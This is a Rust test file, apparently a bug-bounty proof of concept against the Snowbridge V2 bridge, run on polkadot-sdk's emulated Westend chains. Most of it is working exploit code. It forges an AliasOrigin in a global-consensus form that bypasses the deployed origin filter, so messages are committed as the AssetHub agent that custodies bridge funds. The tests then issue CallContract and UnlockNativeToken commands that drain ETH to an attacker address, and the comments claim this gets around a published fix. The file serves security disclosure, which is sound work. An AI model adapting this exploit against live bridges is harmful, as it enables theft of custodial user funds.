// SPDX-License-Identifier: Apache-2.0
// PoC (security research, HackenProof submission support) — built on the
// polkadot-sdk emulated integration test framework (Apache-2.0).
//
//! # Forged alias origin — Snowbridge V2 outbound queue
//!
//! Demonstrates (per HackenProof Snowbridge program rules):
//!   * realistic sender classes on AssetHub Westend driving the REAL stacks
//!     (AH XcmRouter: WithUniqueTopic -> UnpaidRemoteExporter -> XCMP;
//!      BH barrier: DenyExportMessageFrom + AllowExplicitUnpaidExecutionFrom;
//!      BH executor: ExportMessage -> SnowbridgeExporterV2 -> converter ->
//!      EthereumOutboundQueueV2)
//!   * ends with an entry in `snowbridge-pallet-outbound-queue-v2::Messages`
//!     on BridgeHub whose `origin` equals the AssetHub agent id.
//!
//! ## Converter contract (bridges/snowbridge/.../v2/converter/convert.rs)
//! ```ignore
//! WithdrawAsset(ETH)      <- remote fee reserve (Here in Ethereum context)
//! PayFees(ETH)
//! [WithdrawAsset(ENA) | ReserveAssetDeposited(PNA)]  <- optional transfer
//! AliasOrigin(Origin)     <- REQUIRED; becomes Message.origin
//!                            guarded by AllowedAliasOrigin::contains(..)
//! DepositAsset(Asset)     <- mandatory
//! Transact() [OPTIONAL]   <- decoded as ContractCall::V1 -> CallContract (kind 5)
//! SetTopic(Topic)         <- required
//! ```
//!
//! ## The deployed guard vs. the converter's context
//! `SnowbridgeExporterV2` (bridge-hub-westend/bridge_to_ethereum_config.rs):
//! ```ignore
//! type SnowbridgeExporterV2 = EthereumBlobExporter<
//!     ..., AssetHubParaId, EverythingBut<Equals<AssetHubLocation>>>;
//! ```
//! with `AssetHubLocation = {1, [Parachain(1000)]}` — a *BridgeHub-relative*
//! spelling. The converter evaluates the AliasOrigin target **in the Ethereum
//! context**, where `AgentIdOf` can only resolve the *global-consensus*
//! spelling `{1, [GlobalConsensus(Westend), Parachain(1000)]}`. That spelling
//! is NOT equal to the relative one, so the filter lets it through, and it
//! hashes (HashedDescription) to exactly the AssetHub agent id that custodies
//! the bridge funds on the Ethereum Gateway.
//!
//! ## Sender classes (who can reach the converter)
//! `EthereumBlobExporter::validate` requires the executing origin to be
//! exactly `{GC(Westend), Parachain(1000)}` (AssetHubParaId check), i.e. the
//! message must arrive at BridgeHub with a *parachain-level* origin:
//!   * signed users: `pallet_xcm::send` prepends `DescendOrigin([acc])`, so a
//!     signed raw export is rejected; the sanctioned user path is
//!     `InitiateTransfer{destination: ethereum(), preserve_origin: true}`
//!     where the router auto-aliases the *user's own* reanchored location
//!     (test 1 — the honest behavior, no agent forging);
//!   * chain-level (plurality/root-class) sends with interior `Here` reach the
//!     converter with full control over the inner XCM (tests 2-4). The
//!     AllowedAliasOrigin filter is the *last-line* guard for exactly these
//!     messages — and it fails its job for the global-consensus spelling.
//!
//! ## Never call `::para_id()` (or anything borrowing an externality) inside
//! `execute_with` — run 15's backtrace (frames: RefCell::borrow_mut <-
//! `AssetHubWestend::ext_wrapper` <- `AssetHubWestend::para_id` <-
//! `asset_hub_seen_from_ethereum` <- the test closure) pinned the "RefCell
//! already borrowed" failures: `xcm_emulator::Parachain::para_id()` is
//! implemented as `Self::ext_wrapper(|| Self::ParachainInfo::get())`, i.e. it
//! re-borrows the chain externality. Calling it from inside an
//! `AssetHubWestend::execute_with` closure is a nested borrow of the SAME
//! thread-local `RefCell` and panics instantly. Every emulator-dependent
//! value (agent ids, alias targets, sibling locations) is therefore computed
//! BEFORE entering the closure and moved in pre-built.
//!
//! ## Evidence source: MessageQueued events, NOT `Messages` storage
//! The outbound-queue-v2 `Messages` storage is **ephemeral by design**:
//! `Pallet::on_initialize` kills it at the start of every block ("`Messages`
//! is dropped at the beginning of the next block", pallet docs), so by the
//! time a test reads it after the export block, it is already gone. The
//! durable artifact is the `Event::MessageQueued { message: Message }`
//! event, which carries the full `Message { origin, id, fee, commands }`
//! payload. All assertions here therefore extract messages from BridgeHub
//! events (the same artifact the upstream tests rely on).
//!
//! ## Robustness design (per-test process isolation + assert-outside)
//! Two failure modes were observed on CI and engineered away:
//!   1. A panic while a chain externality is borrowed poisons the emulator's
//!      cells and every subsequent test in the same process dies with
//!      `RefCell already borrowed`. The CI workflow therefore runs each PoC
//!      test in its **own process** (fresh statics per test), making test
//!      outcomes fully independent.
//!   2. A failing assertion must never unwind through `execute_with`: every
//!      dispatch `Result` / evidence read is **returned** from the closure
//!      and asserted **outside** of it.
//! Chain setup helpers (`fund_on_*`) are the SDK's own, shared with the
//! passing upstream `snowbridge_v2_outbound` tests.

use crate::{
        imports::*,
        tests::snowbridge_common::*,
};
use hex_literal::hex;
use rococo_westend_system_emulated_network::asset_hub_westend_emulated_chain::
        asset_hub_westend_runtime;
use snowbridge_core::AgentIdOf;
use snowbridge_outbound_queue_primitives::v2::{Command, ContractCall};
use sp_core::{H160, H256};
use testnet_parachains_constants::westend::snowbridge::EthereumNetwork;
use xcm::latest::AssetTransferFilter;
use xcm_executor::traits::ConvertLocation;

/// Unprivileged attacker-controlled Ethereum recipient.
const ATTACKER_ETH: [u8; 20] = hex!("beefcafe00000000000000000000000000000001");

/// Ethereum-native asset (Ether, i.e. `Here` in the Ethereum context) that the
/// message "transfers" so the converter emits a non-empty command list. Only
/// used inside converter input (never executed against balances), so the
/// amount is cosmetic.
const ENA_AMOUNT: u128 = 1_000_000_000_000_000_000; // 1 ETH

/// AssetHub as seen from the Ethereum context (global-consensus form). This is
/// the ONLY form `AgentIdOf` can resolve inside the converter, and it hashes
/// to the AssetHub agent id that custodies bridge funds.
fn asset_hub_seen_from_ethereum() -> Location {
        Location::new(
                1,
                [
                        GlobalConsensus(ByGenesis(WESTEND_GENESIS_HASH)),
                        Parachain(AssetHubWestend::para_id().into()),
                ],
        )
}

/// The BridgeHub-relative AssetHub spelling blocked by the deployed
/// `AllowedAliasOrigin = EverythingBut<Equals<AssetHubLocation>>` filter.
fn blocked_relative_form() -> Location {
        Location::new(1, [Parachain(AssetHubWestend::para_id().into())])
}

/// The AssetHub agent id (what the Ethereum Gateway derives for AssetHub).
fn expected_agent_id() -> H256 {
        AgentIdOf::convert_location(&asset_hub_seen_from_ethereum())
                .expect("AssetHub location resolves to an agent id")
}

/// Attacker-controlled AccountKey20 beneficiary in the Ethereum context.
fn attacker_beneficiary() -> Location {
        Location::new(0, [AccountKey20 { network: None, key: ATTACKER_ETH }])
}

/// Remote fee asset as seen in the Ethereum context: Ether = `Here`.
fn inner_eth_fee() -> Asset {
        Asset { id: AssetId(Location::here()), fun: Fungible(REMOTE_FEE_AMOUNT_IN_ETHER) }
}

/// Native Ether TRANSFER leg as seen in the Ethereum context: `(0, [])`.
/// The converter maps this spelling to `Command::UnlockNativeToken { token:
/// H160([0; 20]), .. }` (convert.rs: "// To allow ether"), which the Gateway's
/// origin-less `HandlersV2.unlockNativeToken` executes against the AssetHub
/// agent's NATIVE balance — the path PR #1788 does not guard.
fn inner_native_eth_transfer() -> Asset {
        Asset { id: AssetId(Location::here()), fun: Fungible(ENA_AMOUNT) }
}

/// WETH (an Ethereum-native asset) as seen in the Ethereum context.
fn inner_weth() -> Asset {
        Asset {
                id: AssetId(Location::new(
                        0,
                        [AccountKey20 { network: None, key: hex!("11b0b11000011b0b11000011b0b11000011b0b11") }],
                )),
                fun: Fungible(ENA_AMOUNT),
        }
}

/// Evidence extracted from BridgeHub **events**: (MessageQueued seen,
/// MessageQueue::Processed success, MessageQueue::Processed failure, and the
/// queued messages as `(origin, command kinds)` pairs). The `kinds` are the
/// converter `Command` variant indices (5 = CallContract), matching
/// `OutboundMessage.commands[].kind` committed to storage in the same block.
///
/// See the module docs: `Messages` storage is ephemeral (killed in
/// `on_initialize`), so events are the durable evidence source.
fn bridge_hub_event_evidence() -> (bool, bool, bool, Vec<(H256, Vec<u8>)>) {
        type RuntimeEvent = <BridgeHubWestend as Chain>::RuntimeEvent;
        let events = <BridgeHubWestend as Chain>::events();
        let mut message_queued = false;
        let mut processed_ok = false;
        let mut processed_fail = false;
        let mut messages: Vec<(H256, Vec<u8>)> = Vec::new();
        for event in events.iter() {
                match event {
                        RuntimeEvent::EthereumOutboundQueueV2(
                                snowbridge_pallet_outbound_queue_v2::Event::MessageQueued {
                                        message,
                                },
                        ) => {
                                message_queued = true;
                                messages.push((
                                        message.origin,
                                        message.commands.iter().map(|c| c.index()).collect(),
                                ));
                        },
                        RuntimeEvent::MessageQueue(pallet_message_queue::Event::Processed {
                                success: true,
                                ..
                        }) => processed_ok = true,
                        RuntimeEvent::MessageQueue(pallet_message_queue::Event::Processed {
                                success: false,
                                ..
                        }) => processed_fail = true,
                        _ => {},
                }
        }
        (message_queued, processed_ok, processed_fail, messages)
}

/// Full payloads of committed `Command::UnlockNativeToken` commands:
/// `(message origin, token, recipient, amount)`. Used by the
/// fix-incompleteness test to prove the committed instruction drains NATIVE
/// ETH (token 0x0) from the AssetHub agent to the attacker.
fn bridge_hub_unlock_native_commands() -> Vec<(H256, H160, H160, u128)> {
        type RuntimeEvent = <BridgeHubWestend as Chain>::RuntimeEvent;
        let events = <BridgeHubWestend as Chain>::events();
        let mut unlocks = Vec::new();
        for event in events.iter() {
                if let RuntimeEvent::EthereumOutboundQueueV2(
                        snowbridge_pallet_outbound_queue_v2::Event::MessageQueued { message },
                ) = event
                {
                        for command in &message.commands {
                                if let Command::UnlockNativeToken { token, recipient, amount } =
                                        command
                                {
                                        unlocks.push((message.origin, *token, *recipient, *amount));
                                }
                        }
                }
        }
        unlocks
}

/// Chain-level export: dispatch an `ExportMessage`-carrying XCM to BridgeHub
/// with interior `Here` (no DescendOrigin is prepended), so the message
/// executes on BridgeHub with origin `{1, [Parachain(1000)]}` — the only
/// sender class `EthereumBlobExporterV2` accepts (AssetHubParaId check).
///
/// Real stacks traversed:
///   AH: pallet_xcm::send_xcm -> XcmRouter(WithUniqueTopic) -> XcmpQueue (XCMP)
///   BH: barrier (DenyExportMessageFrom allows AH; AllowExplicitUnpaidExecutionFrom
///       allows sibling system parachains) -> XcmExecutor -> ExportMessage
///       -> SnowbridgeExporterV2 -> converter -> EthereumOutboundQueueV2::deliver
///
/// `Pallet::<T>::send_xcm(interior, ..)` is the runtime-internal helper: it
/// bypasses the `send`-extrinsic `SendXcmOrigin` filter, and fees are waived
/// for the chain-level origin (`WaivedLocations` contains `Here`), so the
/// attack costs nothing on Polkadot.
///
/// Returns the raw `send_xcm` outcome so the caller can assert OUTSIDE the
/// `execute_with` closure (see the robustness design note). `bh_sibling` is
/// precomputed by the caller — `BridgeHubWestend::para_id()` borrows the BH
/// externality and must not run inside an AH `execute_with` (see module docs).
fn chain_level_export_to_bridge_hub(bh_sibling: Location, inner: Xcm<()>) -> Result<(), String> {
        match asset_hub_westend_runtime::PolkadotXcm::send_xcm(
                Junctions::Here,
                bh_sibling,
                Xcm(vec![
                        UnpaidExecution { weight_limit: WeightLimit::Unlimited, check_origin: None },
                        ExportMessage {
                                network: EthereumNetwork::get().into(),
                                destination: Here,
                                xcm: inner,
                        },
                ]),
        ) {
                Ok(_) => Ok(()),
                Err(e) => Err(format!("{e:?}")),
        }
}

/// TEST 1 (baseline, real user path): a signed, unprivileged AssetHub user
/// sends a Snowbridge V2 transfer via `InitiateTransfer{destination: ethereum(),
/// preserve_origin: true}` — the sanctioned V2 flow (what
/// SnowbridgeSystemFrontend drives, mirrors upstream
/// `send_weth_from_asset_hub_to_ethereum`). The router auto-aliases the
/// *user's own* reanchored location; the committed message carries the USER's
/// agent id, NOT the AssetHub agent id. This pins down the honest baseline the
/// forged tests deviate from.
#[test]
fn poc_baseline_signed_user_initiate_transfer_commits_user_agent() {
        fund_on_bh();
        fund_on_ah();

        let dispatch = AssetHubWestend::execute_with(|| {
                type RuntimeOrigin = <AssetHubWestend as Chain>::RuntimeOrigin;

                let local_fee_asset =
                        Asset { id: AssetId(Location::parent()), fun: Fungible(LOCAL_FEE_AMOUNT_IN_DOT) };
                let remote_fee_asset =
                        Asset { id: AssetId(ethereum()), fun: Fungible(REMOTE_FEE_AMOUNT_IN_ETHER) };
                let reserve_asset =
                        Asset { id: AssetId(weth_location()), fun: Fungible(TOKEN_AMOUNT) };

                let xcm = VersionedXcm::from(Xcm(vec![
                        WithdrawAsset(
                                vec![
                                        reserve_asset.clone(),
                                        remote_fee_asset.clone(),
                                        local_fee_asset.clone(),
                                ]
                                .into(),
                        ),
                        PayFees { asset: local_fee_asset },
                        InitiateTransfer {
                                destination: ethereum(),
                                remote_fees: Some(AssetTransferFilter::ReserveWithdraw(
                                        Definite(remote_fee_asset.into()),
                                )),
                                preserve_origin: true,
                                assets: BoundedVec::truncate_from(vec![
                                        AssetTransferFilter::ReserveWithdraw(Definite(
                                                reserve_asset.into(),
                                        )),
                                ]),
                                remote_xcm: Xcm(vec![DepositAsset {
                                        assets: Wild(AllCounted(2)),
                                        beneficiary: attacker_beneficiary(),
                                }]),
                        },
                ]));

                <AssetHubWestend as AssetHubWestendPallet>::PolkadotXcm::execute(
                        RuntimeOrigin::signed(AssetHubWestendSender::get()),
                        bx!(xcm),
                        Weight::from(EXECUTION_WEIGHT),
                )
        });
        assert!(
                dispatch.is_ok(),
                "baseline InitiateTransfer must dispatch Ok on AssetHub, got {dispatch:?}"
        );

        let (message_queued, processed_ok, _processed_fail, messages) =
                BridgeHubWestend::execute_with(bridge_hub_event_evidence);

        assert!(message_queued, "expected MessageQueued event on BridgeHub");
        assert!(
                processed_ok,
                "expected MessageQueue::Processed{{success:true}} on BridgeHub"
        );
        assert!(
                !messages.is_empty(),
                "expected at least one queued message in MessageQueued events"
        );
        let last_origin = messages.last().expect("message present").0;
        assert_ne!(
                last_origin,
                expected_agent_id(),
                "honest user alias must NOT resolve to the AssetHub agent id"
        );
}

/// TEST 2 (THE BUG): a chain-level AssetHub export carries an inner XCM whose
/// `AliasOrigin` targets the *global-consensus* spelling of AssetHub. The
/// deployed filter (`EverythingBut<Equals<{1,[Parachain(1000)]}>>`) only knows
/// the relative spelling, lets the global one through, and the converter
/// commits a message whose `origin` is the AssetHub agent id — the identity
/// that custodies the bridge funds on the Ethereum Gateway.
#[test]
fn poc_global_consensus_alias_bypasses_deployed_filter() {
        // Precompute everything that borrows an externality BEFORE entering
        // the closure (see module docs — nested borrow = instant panic).
        let expected_agent = expected_agent_id();
        let asset_hub_global = asset_hub_seen_from_ethereum();
        let bh_sibling =
                AssetHubWestend::sibling_location_of(BridgeHubWestend::para_id().into());

        let sent = AssetHubWestend::execute_with(|| {
                let inner = Xcm(vec![
                        WithdrawAsset(inner_eth_fee().into()),
                        PayFees { asset: inner_eth_fee() },
                        WithdrawAsset(inner_weth().into()),
                        // FORGED: alias into the AssetHub agent identity using the
                        // global-consensus spelling the filter does not know.
                        AliasOrigin(asset_hub_global.clone()),
                        DepositAsset {
                                assets: Wild(AllCounted(1)).into(),
                                beneficiary: attacker_beneficiary(),
                        },
                        SetTopic([7u8; 32]),
                ]);

                chain_level_export_to_bridge_hub(bh_sibling.clone(), inner)
        });
        assert!(
                sent.is_ok(),
                "chain-level export must be accepted by pallet_xcm::send, got {sent:?}"
        );

        let (message_queued, processed_ok, _processed_fail, messages) =
                BridgeHubWestend::execute_with(bridge_hub_event_evidence);

        assert!(message_queued, "expected MessageQueued event on BridgeHub");
        assert!(
                processed_ok,
                "expected MessageQueue::Processed{{success:true}} on BridgeHub"
        );
        assert!(
                !messages.is_empty(),
                "expected at least one queued message in MessageQueued events"
        );
        let last_origin = messages.last().expect("message present").0;
        assert_eq!(
                last_origin,
                expected_agent,
                "global-consensus alias bypasses the deployed filter and commits \
                 AS the AssetHub agent id"
        );
}

/// TEST 3 (impact): the forged alias carries a `Transact` whose payload is a
/// SCALE-encoded `ContractCall::V1` — the converter turns it into
/// `Command::CallContract` (kind 5), the exact command the (unfixed on
/// mainnet) Gateway executes from the AssetHub agent, draining its custodial
/// balance to the attacker.
#[test]
fn poc_forged_agent_receives_call_contract_kind5() {
        // Precompute everything that borrows an externality BEFORE entering
        // the closure (see module docs — nested borrow = instant panic).
        let expected_agent = expected_agent_id();
        let asset_hub_global = asset_hub_seen_from_ethereum();
        let bh_sibling =
                AssetHubWestend::sibling_location_of(BridgeHubWestend::para_id().into());

        let sent = AssetHubWestend::execute_with(|| {
                let transact_info = ContractCall::V1 {
                        target: ATTACKER_ETH,
                        calldata: vec![],
                        gas: 50_000,
                        value: 1_000_000_000_000_000_000u128, // 1 ETH from the agent
                };
                let inner = Xcm(vec![
                        WithdrawAsset(inner_eth_fee().into()),
                        PayFees { asset: inner_eth_fee() },
                        AliasOrigin(asset_hub_global.clone()),
                        // mandatory DepositAsset even with no asset transfer
                        DepositAsset { assets: Wild(All).into(), beneficiary: attacker_beneficiary() },
                        Transact {
                                origin_kind: OriginKind::SovereignAccount,
                                fallback_max_weight: None,
                                call: transact_info.encode().into(),
                        },
                        SetTopic([9u8; 32]),
                ]);

                chain_level_export_to_bridge_hub(bh_sibling.clone(), inner)
        });
        assert!(
                sent.is_ok(),
                "chain-level export must be accepted by pallet_xcm::send, got {sent:?}"
        );

        let (message_queued, _processed_ok, _processed_fail, messages) =
                BridgeHubWestend::execute_with(bridge_hub_event_evidence);

        assert!(message_queued, "expected MessageQueued event on BridgeHub");
        assert!(
                !messages.is_empty(),
                "expected at least one queued message in MessageQueued events"
        );
        let last_origin = messages.last().expect("message present").0;
        assert_eq!(
                last_origin,
                expected_agent,
                "origin must be the AssetHub agent"
        );
        assert!(
                messages.iter().any(|(_, kinds)| kinds.contains(&5u8)),
                "expected a CallContract command (kind 5) committed for the \
                 forged AssetHub-agent origin"
        );
}

/// TEST 4 (negative control): the SAME message shape using the
/// *BridgeHub-relative* AssetHub spelling is rejected by the deployed filter
/// (InvalidOrigin -> export fails -> no message queued). Proves the bypass in
/// tests 2/3 is specific to the global-consensus spelling: the guard covers
/// exactly one spelling of the same identity.
///
/// Each PoC test runs in its own process (see module docs), so "no message
/// queued" is checked against the fresh per-process event set directly.
#[test]
fn poc_relative_alias_form_is_rejected_by_deployed_filter() {
        // Precompute everything that borrows an externality BEFORE entering
        // the closure (see module docs — nested borrow = instant panic).
        let asset_hub_relative = blocked_relative_form();
        let bh_sibling =
                AssetHubWestend::sibling_location_of(BridgeHubWestend::para_id().into());

        let sent = AssetHubWestend::execute_with(|| {
                let inner = Xcm(vec![
                        WithdrawAsset(inner_eth_fee().into()),
                        PayFees { asset: inner_eth_fee() },
                        WithdrawAsset(inner_weth().into()),
                        // the form the deployed filter blocks
                        AliasOrigin(asset_hub_relative.clone()),
                        DepositAsset {
                                assets: Wild(AllCounted(1)).into(),
                                beneficiary: attacker_beneficiary(),
                        },
                        SetTopic([10u8; 32]),
                ]);

                chain_level_export_to_bridge_hub(bh_sibling.clone(), inner)
        });
        assert!(
                sent.is_ok(),
                "the send itself must succeed; the filter rejects later at BridgeHub, got {sent:?}"
        );

        let (_message_queued, _processed_ok, processed_fail, messages) =
                BridgeHubWestend::execute_with(bridge_hub_event_evidence);

        assert!(
                processed_fail,
                "converter must reject the relative form (InvalidOrigin) — \
                 MessageQueue::Processed{{success:false}} expected"
        );
        assert!(
                messages.is_empty(),
                "relative AssetHub form must be rejected by AllowedAliasOrigin — \
                 no message may be queued"
        );
}

/// TEST 5 (fix-incompleteness, #1788 bypass): the SAME forged chain-level
/// export carries a native-Ether asset leg instead of a `Transact`. The
/// converter maps the `(0, [])` asset location to `Command::UnlockNativeToken
/// { token: 0x0, recipient, amount }` (convert.rs: "// To allow ether"), and
/// the Ethereum-side handler `HandlersV2.unlockNativeToken` executes it
/// against the AssetHub agent's NATIVE balance with **no origin check at
/// all** — the handler does not even receive `origin`. PR #1788 guards only
/// `HandlersV2.callContract`, so the native-ETH drain of the AssetHub agent
/// remains possible even with #1788 fully deployed. See report
/// `report/HACKENPROOF_REPORT.md` §7.3.
#[test]
fn poc_forged_origin_unlock_native_token_kind2_bypasses_1788() {
        // Precompute everything that borrows an externality BEFORE entering
        // the closure (see module docs — nested borrow = instant panic).
        let expected_agent = expected_agent_id();
        let asset_hub_global = asset_hub_seen_from_ethereum();
        let bh_sibling =
                AssetHubWestend::sibling_location_of(BridgeHubWestend::para_id().into());

        let sent = AssetHubWestend::execute_with(|| {
                let inner = Xcm(vec![
                        WithdrawAsset(inner_eth_fee().into()),
                        PayFees { asset: inner_eth_fee() },
                        // native Ether transfer leg (Ethereum context: `(0, [])`)
                        // → converter emits UnlockNativeToken with token = 0x0
                        WithdrawAsset(inner_native_eth_transfer().into()),
                        AliasOrigin(asset_hub_global.clone()),
                        DepositAsset {
                                assets: Wild(AllCounted(1)).into(),
                                beneficiary: attacker_beneficiary(),
                        },
                        SetTopic([11u8; 32]),
                ]);

                chain_level_export_to_bridge_hub(bh_sibling.clone(), inner)
        });
        assert!(
                sent.is_ok(),
                "chain-level export must be accepted by pallet_xcm::send, got {sent:?}"
        );

        let unlocks =
                BridgeHubWestend::execute_with(bridge_hub_unlock_native_commands);
        assert!(
                !unlocks.is_empty(),
                "expected a committed UnlockNativeToken command — no message queued"
        );
        assert!(
                unlocks.iter().any(|(origin, token, recipient, amount)| {
                        *origin == expected_agent
                                && *token == H160([0u8; 20])
                                && *recipient == H160(ATTACKER_ETH)
                                && *amount > 0
                }),
                "committed UnlockNativeToken must drain NATIVE ETH (token 0x0) \
                 from the AssetHub agent to the attacker — a path PR #1788 does \
                 not guard"
        );
}
